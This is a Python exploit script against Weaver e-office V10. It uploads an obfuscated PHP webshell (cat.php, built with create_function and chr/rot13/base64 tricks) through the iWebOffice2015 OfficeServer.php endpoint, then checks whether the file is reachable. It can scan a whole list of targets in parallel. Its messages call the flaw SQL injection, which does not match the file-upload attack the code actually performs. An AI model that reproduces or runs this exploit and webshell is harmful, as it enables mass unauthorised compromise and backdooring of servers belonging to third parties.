import sys
import requests
import urllib3
import time
import argparse
import multiprocessing
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    url1 = target_url + 'eoffice10/server/public/iWebOffice2015/OfficeServer.php'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Length': '997',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'null',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew",
        'Connection': 'close'
    }
    data = "------WebKitFormBoundaryLpoiBFy4ANA8daew\r\nContent-Disposition:form-data;name=\"FileData\";filename=\"cat.php\"\r\nContent-Type:application/octet-stream\r\n\r\nhacker\r\n<?php\r\n$FYDC=create_function(chr(0x864c/0x3bb).chr(113160/984).chr(246-135).str_rot13('z').str_rot13('r'),chr(0134556/0726).str_rot13('i').chr(0x1c9-0x168).base64_decode('bA==').chr(0613-0543).chr(0x1d5-0x1b1).chr(104535/909).chr(0xd476/0x1ea).chr(255-146).str_rot13('r').base64_decode('KQ==').chr(0100701/01063));$FYDC(base64_decode('Njg3N'.'TQ3O0'.'BldkF'.'sKCRf'.''.chr(0x87cd/0x199).base64_decode('RQ==').chr(0x217-0x1de).str_rot13('G').base64_decode('Vg==').''.''.chr(831-761).chr(0261664/01421).str_rot13('1').base64_decode('VA==').chr(0312176/01666).''.'dzVFp'.'kR10p'.'OzIwN'.'jI2ND'.'E7'.''));\r\n?>\n\r\n------WebKitFormBoundaryLpoiBFy4ANA8daew\r\nContent-Disposition:form-data;name=\"FormData\"\r\n\r\n{'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'cat.php'}\r\n------WebKitFormBoundaryLpoiBFy4ANA8daew--"
    console.print(now_time() + " [INFO]     正在检测泛微V10 的sql注入漏洞", style='bold blue')
    try:
        result = requests.post(url1, headers=headers, data=data, verify=False)
        res = target_url+'eoffice10/server/public/iWebOffice2015/Document/cat.php'
        if 'hacker' in requests.get(res).text:
            console.print(now_time() + " [SUCCESS]     存在泛微V10 的sql注入漏洞", style='bold green')
        else:
            console.print(now_time() + " [WARNING]  不存在泛微V10 的sql注入漏洞", style='bold red')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')
        
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
